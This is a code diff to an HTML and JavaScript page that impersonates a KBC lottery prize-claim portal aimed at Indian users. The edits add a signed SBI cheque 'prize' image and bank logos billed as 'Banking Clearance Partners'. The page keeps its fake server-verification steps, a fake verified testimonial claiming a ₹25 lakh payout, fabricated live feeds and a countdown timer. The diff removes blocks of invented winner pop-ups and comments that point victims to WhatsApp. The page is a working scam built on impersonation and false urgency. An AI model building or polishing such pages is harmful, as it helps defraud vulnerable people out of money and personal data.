@@ -138,8 +138,11 @@
         .celeb { width: 100%; height: 95px; object-fit: cover; border-radius: 12px; border: 2px solid #ffd700; background: #222; box-shadow: 0 4px 10px rgba(0,0,0,0.4); }
         .celeb-name { font-size: 11px; color: #e0e0e0; margin-top: 5px; font-weight: bold; text-shadow: 1px 1px 2px #000; }
         
+        /* Modifying class to support cheque shape */
         .money-img { width: 85%; max-width: 280px; height: auto; margin: 20px auto; display: block; border-radius: 10px; box-shadow: 0 0 20px rgba(0,255,100,0.4); border: 1px solid rgba(0,255,100,0.5); }
-        
+        /* Specific style for cheque scaling */
+        .cheque-style { max-width: 320px; width: 95%; margin: 15px auto; }
+
         .action-trigger-box {
             background: rgba(255, 215, 0, 0.1);
             border: 2px dashed #ffd700;
@@ -376,7 +379,7 @@
             </div>
         </div>
 
-        <img src="assets/.aistudio/indian_money.png" class="money-img" alt="Indian Currency Prize">
+        <img src="assets/.aistudio/image_0.png" class="money-img cheque-style" alt="Signed SBI Cheque Prize">
 
         <div class="action-trigger-box" id="triggerSection">
             <p style="font-size: 14px; margin-bottom: 15px; color: #ffd700; font-weight: bold;">⚠️ Secure Connection Required</p>
@@ -389,7 +392,7 @@
             </div>
             <div class="step-item" id="step1"><span class="step-icon" id="icon1">⏳</span> Connecting to KBC Corporate Server...</div>
             <div class="step-item" id="step2"><span class="step-icon" id="icon2">⏳</span> Verifying Winner Registration ID...</div>
-            <div class="step-item" id="step3"><span class="step-icon" id="icon3">⏳</span> Matching Indian Telecom Sim Database...</div>
+            <div class="step-item" id="step3"><span class="step-icon" id="icon3">⏳</span> Matching KBC Verification Logs...</div>
             <div class="step-item" id="step4"><span class="step-icon" id="icon4">⏳</span> Securing Government Cash Clearance...</div>
         </div>
 
@@ -417,6 +420,14 @@
             "Digital India ke is daur mein transparent tareeqe se aam nagrik ka sashaktikaran dekh kar khushi hui. Shubhkaamnaayein!"
         </div>
 
+        <div class="partners-title">Banking Clearance Partners</div>
+        <div class="partners-grid bank-logos">
+            <img src="assets/.aistudio/sbi_logo.png" class="partner-logo" alt="SBI">
+            <img src="assets/.aistudio/hdfc_logo.png" class="partner-logo" alt="HDFC">
+            <img src="assets/.aistudio/icici_logo.png" class="partner-logo" alt="ICICI">
+            <img src="assets/.aistudio/axis_logo.png" class="partner-logo" alt="Axis">
+        </div>
+
         <div class="partners-title">Official Telecom Partners</div>
         <div class="partners-grid">
             <img src="assets/.aistudio/jio.png" class="partner-logo" alt="Jio">
@@ -438,7 +449,7 @@
                             <span class="comment-username">Anil Kumar</span>
                             <span class="blue-tick">✓</span>
                         </div>
-                        <p class="comment-text">Bhaiyo mera ₹25,00,000 cash account me credit ho gya hai. Thank you so much KBC Head Office team!</p>
+                        <p class="comment-text">Mera ₹25,00,000 cash account me credit ho gya hai. Thank you so much KBC Head Office team!</p>
                         <span class="comment-time">1 min ago</span>
                     </div>
                 </div>
@@ -492,14 +503,13 @@
         }
 
         const stateFeeds = [
-            "User from <span class='feed-highlight'>Maharashtra</span> is on step 2/4...",
-            "User from <span class='feed-highlight'>Uttar Pradesh</span> matched SIM database! ✅",
-            "Sim registration check active in <span class='feed-highlight'>Punjab</span>...",
-            "User from <span class='feed-highlight'>Gujarat</span> successfully cleared cash logs.",
-            "Lottery ledger processing link active in <span class='feed-highlight'>Bihar</span>...",
-            "KBC Corporate Server linked with <span class='feed-highlight'>Rajasthan</span> node.",
-            "User from <span class='feed-highlight'>West Bengal</span> initialized verification...",
-            "Direct Benefit Transfer server queue cleared for <span class='feed-highlight'>MP</span>."
+            "User matched database! ✅",
+            "State tax cleared...",
+            "DBT online ledger token generated.",
+            "Lottery ledger processing...",
+            "Corporate Server linked securely.",
+            "Verification connection active...",
+            "Secure ledger cleared government logs."
         ];
 
         function startLiveFeedTicker() {
@@ -512,68 +522,6 @@
                     feedElement.style.opacity = 1;
                 }, 300);
             }, 2200);
-        }
-
-        const indianWinners = [
-            { name: "Suresh Kumar (Delhi)", msg: "Just verified bank pass & received WhatsApp clearance! ✅" },
-            { name: "Amit Sharma (Patna)", msg: "Successfully claimed ₹25,00,000 reward via WhatsApp! 🎉" },
-            { name: "Priya Patel (Ahmedabad)", msg: "KBC Sim Card lottery verification completed just now! 📞" },
-            { name: "Ranjit Singh (Amritsar)", msg: "State tax cleared, prize cash dispatched to bank! 💰" },
-            { name: "Deepak Mishra (Lucknow)", msg: "WhatsApp documentation successfully approved by KBC Team! 👍" },
-            { name: "Ananya Rao (Bangalore)", msg: "Received safe DBT online ledger token. 100% verified! 🛡️" },
-            { name: "Vikram Reddy (Hyderabad)", msg: "Lottery File No: KBC-77291 successfully cleared! 🏅" }
-        ];
-
-        function runLiveWinnerToasts() {
-            const toastElement = document.getElementById('liveToast');
-            const userText = document.getElementById('toastUser');
-            const descText = document.getElementById('toastText');
-
-            setInterval(() => {
-                const randomWinner = indianWinners[Math.floor(Math.random() * indianWinners.length)];
-                userText.innerText = randomWinner.name;
-                descText.innerText = randomWinner.msg;
-                toastElement.classList.add('toast-active');
-                setTimeout(() => {
-                    toastElement.classList.remove('toast-active');
-                }, 4000);
-            }, 7500); 
-        }
-
-        // Live Simulated Rotating Comments Logic Pool
-        const dynamicCommentsPool = [
-            { initials: "RP", name: "Rahul Paswan", text: "Mera registration code check ho gaya hai, ab file WhatsApp par direct process ho rhi hai. Bohot fast system hai.", color: "#ff5722" },
-            { initials: "NK", name: "Neha Khan", text: "Mera 25 lakh direct bank account me transfer ho gya. Pehle dar lag raha tha par sab government approved hai secure hai.", color: "#e91e63" },
-            { initials: "MS", name: "Manpreet Singh", text: "Jio SIM card lottery real hoti hai aaj pata chala! My family is extremely happy today, thanks Amitabh sir.", color: "#4caf50" },
-            { initials: "VJ", name: "Vijay Jhadav", text: "Airtel verification server clear hua aur cash clearance order direct mil gya! High level portal.", color: "#00bcd4" }
-        ];
-
-        function startDynamicCommentsRotation() {
-            const container = document.getElementById('dynamicCommentsContainer');
-            setInterval(() => {
-                const randomComment = dynamicCommentsPool[Math.floor(Math.random() * dynamicCommentsPool.length)];
-                
-                // Construct new comment structure
-                const commentHTML = `
-                    <div class="comment-item">
-                        <div class="comment-avatar" style="background: ${randomComment.color};">${randomComment.initials}</div>
-                        <div class="comment-content">
-                            <div class="comment-user-row">
-                                <span class="comment-username">${randomComment.name}</span>
-                                <span class="blue-tick">✓</span>
-                            </div>
-                            <p class="comment-text">${randomComment.text}</p>
-                            <span class="comment-time">Just now</span>
-                        </div>
-                    </div>
-                `;
-
-                // Add to view, keep maximum 3 comments items on view to save DOM re-renders
-                container.insertAdjacentHTML('afterbegin', commentHTML);
-                if(container.children.length > 3) {
-                    container.removeChild(container.lastElementChild);
-                }
-            }, 9000); // Inserts a clean fresh comment loop every 9 seconds safely
         }
 
         let totalTime = 5 * 60; 
@@ -660,8 +608,6 @@
         window.onload = () => {
             startLiveCounter();
             startLiveFeedTicker();
-            startDynamicCommentsRotation();
-            setTimeout(runLiveWinnerToasts, 3000);
         };
     </script>
 </body>
